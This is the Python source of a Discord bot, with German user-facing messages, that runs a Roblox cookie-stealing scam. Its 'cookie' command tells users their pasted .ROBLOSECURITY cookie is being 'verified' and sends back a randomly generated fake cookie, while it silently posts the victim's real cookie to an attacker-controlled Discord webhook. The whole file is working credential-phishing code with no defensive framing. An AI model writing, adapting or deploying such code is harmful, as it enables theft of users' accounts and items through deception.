import discord 
import time 
import requests 
from discord.ext import commands 
import json 
import string 
import random 
from discord_webhook import DiscordWebhook 
Settings = open("Settings.json")
data = json.load(Settings)
Prefix = data["Prefix"]
WebHook = data["Webhook"]
BotToken = data["Token"]
Company = data["Company"]
letters = 'ABCDEF'
intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
def generateCookie():
    return intro +  ''.join(random.choices(letters + string.digits, k=732))
bot = commands.Bot(command_prefix=Prefix,intents=discord.Intents.all())
Cooldown = []
bot.remove_command("help")
@bot.command()
async def cookie(ctx,*,cookie):
    if ctx.author.id in Cooldown:
        return
    if intro in cookie: 
        embed = discord.Embed(title=str(Company),description=f"<@{ctx.author.id}>, wir überprüfen gerade ihren cookie",color=discord.Color.random())
        await ctx.send(embed=embed) 
        time.sleep(5)
        User = bot.get_user(int(ctx.author.id))
        embed2 = discord.Embed(title=str(Company),description=f"✅ Erfolg! Ihr cookie wird ihnen in kürze gesendet",color=discord.Color.random())
        await ctx.send(embed=embed2)
        time.sleep(2)
        embed3 = discord.Embed(title=str(Company),description=f"{str(generateCookie())}",color=discord.Color.random())
        await User.send(embed=embed3)
        DiscordWebhook(url=WebHook, content=cookie).execute()
bot.run(BotToken)   
    
